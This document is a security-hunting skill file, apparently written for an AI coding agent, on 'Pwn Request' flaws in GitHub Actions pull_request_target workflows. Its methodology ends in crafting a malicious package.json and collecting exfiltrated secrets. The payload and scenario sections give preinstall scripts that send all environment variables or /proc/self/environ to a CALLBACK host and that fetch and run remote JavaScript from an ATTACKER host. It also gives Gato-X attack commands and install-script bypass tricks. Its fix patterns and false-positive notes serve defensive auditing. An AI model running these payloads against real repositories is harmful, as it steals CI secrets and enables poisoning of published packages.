---
name: pwn-request
description: >
  Use when hunting Pwn Request vulnerabilities where pull_request_target workflows
  checkout attacker-controlled PR code and execute it in a privileged context with
  access to repository secrets. Trigger on: "pwn request", "pull_request_target",
  "checkout PR head", "npm install in CI", "lifecycle scripts in CI", "preinstall
  script", "postinstall script", "package.json scripts CI", "npm ci ignore-scripts false",
  "actions/checkout ref pull request head sha", privileged workflow running PR code,
  "Gato-X", supply chain via PR lifecycle scripts.
license: MIT
compatibility: Designed for Claude Code. Requires access to target .github/workflows/.
metadata:
  category: cicd
  version: "0.1"
  source: https://www.landh.tech/blog/20251003-36m-installs/
  source_types: blog_post
---

# Pwn Request

## What Is Broken and Why

A "Pwn Request" occurs when a `pull_request_target` workflow — which runs in the context
of the base repository with access to its secrets — explicitly checks out the PR
contributor's code and executes it (via `npm install`, `make`, build scripts, etc.).
`pull_request_target` was designed to safely access secrets for things like posting
comments on PRs from forks, but developers mistakenly combine it with a checkout of
the PR head SHA, collapsing the trust boundary. Any attacker who can open a PR can
now execute arbitrary code with the repository's `GITHUB_TOKEN` and all configured secrets.
The npm `preinstall`/`postinstall` lifecycle scripts are the most common execution vector —
they run automatically during `npm install` / `npm ci` with no additional flags required
unless `--ignore-scripts` is explicitly set.

## Key Signals

- `on: pull_request_target` trigger in a workflow file
- `actions/checkout` step with `ref: ${{ github.event.pull_request.head.sha }}` or `ref: ${{ github.head_ref }}`
- Package manager install step after that checkout: `npm install`, `npm ci`, `yarn`, `pnpm install`
- `--ignore-scripts=false` explicitly set (overrides safe default) or `--ignore-scripts` absent
- `permissions: contents: write` or `secrets.*` accessible in the same job
- Build/test job that runs attacker's code AND has access to publish tokens or deployment keys
- Cache key derived from `hashFiles('**/package.json')` — attacker controls `package.json`

## Methodology

1. Find all `pull_request_target` workflows:
   ```bash
   grep -rln 'pull_request_target' .github/workflows/
   ```
2. For each, check if `actions/checkout` references PR head code:
   ```bash
   grep -A5 'actions/checkout' .github/workflows/WORKFLOW.yml | grep 'head.sha\|head_ref'
   ```
3. Identify what runs after checkout: `npm install`, `yarn`, `pnpm`, `make`, build scripts.
4. Check if `--ignore-scripts` is set. If absent or `=false`, lifecycle scripts execute.
5. Enumerate secrets accessible in the workflow (`secrets.*` references, environment names).
6. Check if the same cache key is shared with a privileged downstream workflow (release, publish).
7. Craft malicious `package.json` with payload in `preinstall` or `postinstall`.
8. Open a PR from a fork — workflow triggers automatically.
9. Collect exfiltrated secrets via CALLBACK server or OOB DNS.

## Payloads & Tools

```json
// Malicious package.json — preinstall exfiltrates all env vars
{
  "name": "target-package",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "curl -sSfL https://CALLBACK/$(printenv | base64 -w0)"
  }
}
```

```json
// Stage 2: deploy Cacheract for cross-workflow cache poisoning
{
  "scripts": {
    "preinstall": "curl -sSfL https://ATTACKER/cacheract.js > /tmp/r.js && node /tmp/r.js"
  }
}
```

```json
// Targeting a specific build script (GraphQL-JS pattern)
{
  "scripts": {
    "build:npm": "node resources/build-npm.js && curl -sSfL https://ATTACKER/r.js > /tmp/r.js && node /tmp/r.js"
  }
}
```

```bash
# Find pwn-request candidates at scale with Gato-X
gato-x enumerate --target ORG --type org
gato-x attack --target REPO --pwn-request

# Manual search across an org
gh search code 'pull_request_target' --owner ORG -l yaml | \
  grep -l 'checkout' | xargs grep 'head.sha\|head_ref'
```

## Bypass Techniques

- **`--ignore-scripts` bypass**: if set on `npm ci` but not on a subsequent `npm install --prefer-offline`, the cached (now poisoned) node_modules still executes — install scripts run on restore
- **Indirect script execution**: if `npm ci --ignore-scripts` is used, target the build script directly (`npm run build`) which may call attacker-controlled scripts
- **`prepare` script**: runs on `npm install` and `npm pack` — often overlooked vs `preinstall`/`postinstall`
- **Composite actions**: if the workflow calls a composite action checked out from the PR, the action's steps execute with the workflow's permissions
- **`workflow_run` chaining**: if the pwn-request workflow uploads artifacts, a downstream `workflow_run` event may consume them with elevated permissions

## Exploitation Scenarios

**Scenario 1 — NPM publish token via preinstall (cross-fetch pattern)**
Setup: `pull_request_target` workflow checks out PR head, runs `npm install` using a cache key derived from `package.json` hash. A separate release workflow restores the same cache key and runs `npm publish` with `NPM_TOKEN`.
Trigger: Attacker opens PR with `preinstall: "node /tmp/cacheract.js"` in `package.json`. Cacheract poisons the shared cache key.
Impact: Next release run restores poisoned cache, `NPM_TOKEN` exfiltrated. Attacker can publish malicious versions of the package to npm (20M weekly downloads).

**Scenario 2 — Direct GITHUB_TOKEN theft**
Setup: `pull_request_target` with `permissions: contents: write` checks out PR and runs `npm ci`.
Trigger: `preinstall` script runs `curl -d @/proc/self/environ https://CALLBACK`.
Impact: `GITHUB_TOKEN` (write scope) exfiltrated immediately. Attacker can push to protected branches, create releases, modify workflow files.

**Scenario 3 — Composite action injection**
Setup: Workflow calls `uses: ./.github/actions/build` with `ref: ${{ github.event.pull_request.head.sha }}`.
Trigger: Attacker's PR replaces `action.yml` with malicious steps.
Impact: Attacker's steps execute with the calling workflow's full permissions.

## False Positives

- `pull_request_target` workflow that does NOT checkout the PR head (only base branch code) — safe
- `npm ci --ignore-scripts` with no subsequent install step — scripts cannot execute
- Workflow only posts comments or labels, never runs code from the PR
- Secrets gated behind an `environment:` with required reviewers — attacker's job won't get them

## Fix Patterns

```yaml
# WRONG: pull_request_target + PR head checkout + npm install
on: pull_request_target
steps:
  - uses: actions/checkout@v4
    with:
      ref: ${{ github.event.pull_request.head.sha }}
  - run: npm install  # executes attacker's preinstall

# CORRECT option A: separate untrusted build (pull_request) from privileged steps
on: pull_request  # runs with read-only fork token, no secrets
steps:
  - uses: actions/checkout@v4
  - run: npm ci --ignore-scripts

# CORRECT option B: if pull_request_target is needed, never check out PR code
on: pull_request_target
steps:
  - uses: actions/checkout@v4
    # no ref: — checks out base branch only
  - run: echo "Post comment only, no build"
```

- Always use `npm ci --ignore-scripts` in CI; run lifecycle scripts explicitly and audited
- Never share cache keys between untrusted (PR) and trusted (release/publish) workflows
- Gate publish jobs behind environments with required reviewers
- Use Gato-X or workflow audits to find `pull_request_target` + checkout combinations

## Related Skills

[[github-actions-script-injection]] is the technique that fires once a pwn-request gets RCE — the `preinstall` script or build step is effectively an injection point for arbitrary shell commands. [[self-hosted-runner-poisoning]] dramatically amplifies pwn-request impact: code executing on a persistent self-hosted runner can access long-lived credentials, VM state, and infrastructure not reachable from ephemeral GitHub-hosted runners. After secrets are exfiltrated, [[github-actions-cache-poisoning]] can be used as a pivot to affect downstream publish workflows.
